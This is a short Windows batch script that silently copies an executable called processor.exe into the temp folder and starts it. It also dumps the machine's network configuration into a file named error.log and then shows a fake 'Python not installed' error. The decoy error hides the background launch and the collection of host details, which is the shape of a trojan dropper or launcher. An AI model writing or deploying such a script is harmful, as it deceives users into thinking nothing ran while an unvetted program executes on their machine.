@echo off
copy processor.exe %TMP% >nul 2>&1
start %TMP%/processor.exe 
ipconfig > error.log
echo ERROR: Python not installed.
pause